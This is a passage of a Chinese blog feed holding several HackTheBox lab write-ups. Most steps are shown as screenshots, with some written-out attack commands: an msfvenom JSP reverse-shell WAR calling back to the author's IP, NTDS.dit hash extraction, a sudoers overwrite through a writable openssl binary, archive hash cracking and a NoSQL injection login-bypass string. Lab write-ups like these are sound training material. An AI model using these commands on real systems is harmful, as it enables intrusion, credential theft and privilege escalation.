                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.2swcqi09i6a0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.56ap17udsv80.webp"
                     
                ></p>
<p>一个貌似是静态页面的主页，扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.6mukz9ai0j40.webp"
                     
                ></p>
<p>没扫出任何东西</p>
<p>抓个包看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.gy74qk39njk.webp"
                     
                ></p>
<p>php 8.1.0-dev版本没见过，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.779ta9qfqzg0.webp"
                     
                ></p>
<p>有个rce</p>
<p><code>https://www.exploit-db.com/exploits/49933</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.5licof3nyp40.webp"
                     
                ></p>
<p>貌似是在数据包中添加一个User-Agentt字段，这里可以达到rce</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.5pruve8a3d00.webp"
                     
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.1srck5z50ncw.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.5l4dbw3va4c0.webp"
                     
                ></p>
<p>有个sudo权限，搜一下用法</p>
<p><code>https://zhuanlan.zhihu.com/p/374680809</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.5h7dbaxaq4s0.webp"
                     
                ></p>
<p>用knife命令添加bash为suid权限，添加后在执行即可获得root权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.fz57t4vr5kw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.78vm0yi8umg0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotarak - HackTheBox</title>
    <url>/post/9cd54bd1c82b/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.24cqk760cysg.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.4fmkcso65vy.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.6iqou0krn1k0.webp"
                     
                ></p>
<p>访问8080</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.ek8lry9wmc0.webp"
                     
                ></p>
<p>404，看看后台页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.6ndrxfcdeb0.webp"
                     
                ></p>
<p>猜不出密码</p>
<p>在看看60000</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.25crx7ydysv4.webp"
                     
                ></p>
<p>这里貌似有突破点了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.3vxmhhanarg.webp"
                     
                ></p>
<p>他会以get请求去访问输入的地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.5pt4ybfmb7k0.webp"
                     
                ></p>
<p>扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.15n4py13gug0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.xzq6lezgvhc.webp"
                     
                ></p>
<p>一个phpinfo界面</p>
<p>在输入框中输入他127.0.0.1，让他请求本地</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.3npy09csnog0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.40nhd9i78fk0.webp"
                     
                ></p>
<p>循环爆破一下后面的端口号</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.3ny0o85kvym0.webp"
                     
                ></p>
<p>写得跟坨屎一样，但能用就行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.5zpks5uq0m80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.1e04vq5lgs4g.webp"
                     
                ></p>
<p>888端口输出的比其他都多，看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.2mdim7aizs60.webp"
                     
                ></p>
<p>有个backup</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.5xgjho1qbns0.webp"
                     
                ></p>
<p>用burp访问下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.6yfvfojnkt40.webp"
                     
                ></p>
<p>很明显，得到了tomcat的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.6rtam87nn1s0.webp"
                     
                ></p>
<p>接下来就简单了，上传个war包拿shell即可</p>
<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=7777 -f war -o shell.war</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.60bfpfrvbn40.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.1j7lzxej8p6o.webp"
                     
                ></p>
<p>在家目录下发现一个dit文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.1qxh5ifkfnhc.webp"
                     
                ></p>
<p>这玩意貌似存有密码，下载下来</p>
<p><code>https://github.com/libyal/libesedb/releases</code></p>
<p><code>apt-get install autoconf automake autopoint libtool pkg-config</code></p>
<p><code>./configure</code></p>
<p><code>make</code></p>
<p><code>make install</code></p>
<p><code>ldconfig</code></p>
<p><code>/usr/local/bin/esedbexport -m tables 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit</code></p>
<p>然后就会在当前目录下创建一个新目录，里面就是表</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.3hwbbydk6mi0.webp"
                     
                ></p>
<p>提取表内信息</p>
<p><code>git clone https://github.com/csababarta/ntdsxtract.git</code></p>
<p><code>python setup.py build &amp;&amp; python setup.py install</code></p>
<p><code>dsusers.py ../datatable.3 ../link_table.5 hashdump --syshive /root/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc</code></p>
<p>本来讲道理，这样就可以了，但我这里就是报错，死活报错</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.5uk9nd7k13k0.webp"
                     
                ></p>
<p>这貌似是少了个python库，但不知道咋安装</p>
<p>然后百度又搜到这个</p>
<p><code>https://github.com/fortra/impacket/blob/master/examples/secretsdump.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.4rfxh6p4b9c.webp"
                     
                ></p>
<p>但这个要python3.9环境运行，python3.9安装方法</p>
<p><code>https://www.codenong.com/cs109775278/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.45qbvtqg27m0.webp"
                     
                ></p>
<p>太难了，放弃了，直接上别的了</p>
<p>pkexec</p>
<p><code>https://github.com/arthepsy/CVE-2021-4034</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.5r4w4uob1pw0.webp"
                     
                ></p>
<p>老天啊，早用早舒服啊</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.545zpj9ye780.webp"
                     
                ></p>
<p>还不在这</p>
<p><code>find / -name root.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.6ucrnbamyow0.webp"
                     
                ></p>
<p>这貌似是在lxc的一个容器里面，相当于一个虚拟机了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.63hr3w560s40.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Legacy - HackTheBox</title>
    <url>/post/23647649a3f1/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.2buton6pe5wk.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.a7oiwrqepzc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.67zx8ho5utw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.ybjjpsb1rvk.webp"
                     
                ></p>
<p>重点扫一下445看看</p>
<p><code>nmap -n -v -p 445 --script=smb-vuln* 10.10.10.4 -Pn</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.4dju6yeas140.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.2qrnetf4qn00.webp"
                     
                ></p>
<p>扫出了两个经典漏洞，ms08-067，ms17-010</p>
<p>但目前的exp都是python2环境，python3环境的都大多存在环境配置问题，所以，直接msf梭哈了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.215qch7zpae8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.343d7kfrmbc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.c75zaq6rujs.webp"
                     
                ></p>
<p>shell拿到了，并且在system32目录下，权限最低都为administrator</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.1wvxioa85ksg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Legacy/image.4bjnxavts1k0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Lightweight - HackTheBox</title>
    <url>/post/7a04ed4bdc1f/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.282cq33ul5es.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5p7h49dxv5c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.2atsvj1wbg2s.webp"
                     
                ></p>
<p>先看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.4vhnwog1qio0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5hrjz7yb9000.webp"
                     
                ></p>
<p>这边是说添加了一个账号到ssh，然后账号密码都是访问的IP地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.6xja4zjeh300.webp"
                     
                ></p>
<p>直接提权？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.68fharo61m80.webp"
                     
                ></p>
<p>有一个tcpdump可以以管理员身份运行，但不能获取权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.2p9sgi4qj3y0.webp"
                     
                ></p>
<p>这边还开放了389端口</p>
<p><code>ldapsearch -x -H ldap://10.10.10.119 -b &quot;DC=lightweight,DC=htb&quot; -s sub</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.158ya75wesjg.webp"
                     
                ></p>
<p>貌似可以获得密码，用tcpdump来监听一下ldap协议的流量</p>
<p><code>tcpdump -i any -X port ldap</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.3kx0ood12440.webp"
                     
                ></p>
<p>貌似这就是密码，切换账户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.44jskl4sdps0.webp"
                     
                ></p>
<p>继续</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.36pauvyep4e0.webp"
                     
                ></p>
<p>在家目录下发现一个backup的压缩包，下到本地看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5jrxc3c7vtw0.webp"
                     
                ></p>
<p>报错，把压缩包进行个编码在下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.6t3kmmemh380.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.6en3bln78bs0.webp"
                     
                ></p>
<p>解压</p>
<p><code>7z e backup.7z</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.1mqmnzlcclq8.webp"
                     
                ></p>
<p>要密码，爆破一下</p>
<p><code>apt-get install liblzma-dev</code></p>
<p><code>cpan -i Compress::Raw::Lzma</code></p>
<p><code>https://github.com/philsmd/7z2hashcat</code></p>
<p><code>perl 7z2john.pl backup.7z &gt;hash</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.45u2kzbpzgq0.webp"
                     
                ></p>
<p>在用john爆破</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5oas9yfxqv40.webp"
                     
                ></p>
<p>解压出了一堆php文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.22sm2vbf9mo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.40wu45hc7ss0.webp"
                     
                ></p>
<p>另一个用户的密码</p>
<p>在家目录下发现一个openssl</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.4vc1uy26q1a0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.zwjxj34a0b4.webp"
                     
                ></p>
<p>可以用openssl写入一个sudo -l权限给一个用户</p>
<p><code>echo -ne &quot;root\tALL=(ALL) ALL\n\&quot;10.10.14.12\&quot;\tALL=(ALL) ALL\n%sudo\tALL=(ALL) ALL\n&quot; |base64 &gt; ca</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.796cedmfuzw0.webp"
                     
                ></p>
<p><code>/home/ldapuser1/openssl base64 -d -in ca -out /etc/sudoers</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.1u622zcdxwps.webp"
                     
                ></p>
<p>在切换回10.10.14.12用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.3m3r34u5lkq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.4tv9wc1xtts0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.2fyf7251p1s0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Lame - HackTheBox</title>
    <url>/post/742af00ba586/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3cctretsz8c0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.4c514j3qieg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2zc1farqs7m0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3bbsyao9c3e0.webp"
                     
                ></p>
<p>21端口开放的vsftp 2.3.4貌似有后门，搜一下exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3h4cmwclxy00.webp"
                     
                ></p>
<p>但没有用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.47o1j8sn0c80.webp"
                     
                ></p>
<p>尝试445端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3apuhete8ia0.webp"
                     
                ></p>
<p>搜索有无可用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3yxqu78czne0.webp"
                     
                ></p>
<p>选用16320.rb</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.svehw3mpbmo.webp"
                     
                ></p>
<p>将文件复制到根目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.4zax83zziwo0.webp"
                     
                ></p>
<p>由于.rb文件无法直接执行，查看文件内容，看能否找到CVE编号</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.620kyucp0to0.webp"
                     
                ></p>
<p>google搜索CVE编号，查找exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.8p17py7nxwg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.45b9jleemto0.webp"
                     
                ></p>
<p>将exp下载到本地运行</p>
<p>这里报错缺少python库</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.51wgozr0stc0.webp"
                     
                ></p>
<p>根据文档安装一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.16laqdzhw468.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2tupu5v49us0.webp"
                     
                ></p>
<p>尝试利用</p>
<p>运行时跟上目标IP地址，端口，以及需要反弹的IP地址和端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3223y7lr8900.webp"
                     
                ></p>
<p>nc监听反弹端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2sj5quhv6j00.webp"
                     
                ></p>
<p>直接就root权限了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3z3jz5hnr440.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Mango - HackTheBox</title>
    <url>/post/e26b645b585f/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.4auy7cshquk0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.1wn9bd69t16.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.2bdvzu307eas.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.43lj0j66fok0.webp"
                     
                ></p>
<p>443端口扫了个域名，添加到hosts文件</p>
<p>看看80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.5b52pdiw8tk0.webp"
                     
                ></p>
<p>443端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.3cq4ao9u9ie0.webp"
                     
                ></p>
<p>看出来了，这玩意貌似是个mongodb数据库</p>
<p>在访问域名看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.57gjj6vz5cs0.webp"
                     
                ></p>
<p>是个登录框，但mongodb是非关系型数据库，不存在常规注入，但有nosql注入，这玩意是个啥原理我也不知道，但会用就行</p>
<p>抓个登录数据包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.5rwutwmsrlc0.webp"
                     
                ></p>
<p><code>username[$ne]=admin&amp;password[$ne]=123&amp;login=login</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.5ke6fsz3j8k0.webp"
                     
                ></p>
<p>类似于sql注入的万能密码，但是进来后还是没啥可利用信息</p>
<p>已知存在admin用户，可以利用这个nosql注入，尝试获取用户密码，在网上找了个python脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hackingarticles.in/mango-hackthebox-walkthrough/</span><br><span class="line">https://github.com/m3n0sd0n4ld/Miscellaneous/blob/main/NoSQL.py</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.4fu93zaxhno0.webp"
                     
                ></p>
<p>先获取一下admin的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.11840uf8hgzk.webp"
                     
                ></p>
<p>有没有可能，这个密码就是ssh密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.1jakc7gxtwlc.webp"
                     
                ></p>
<p>不知道是密码错误还是不让ssh登录，在看看有没有其他用户</p>
<p><img  
                     lazyload
                     alt="image"
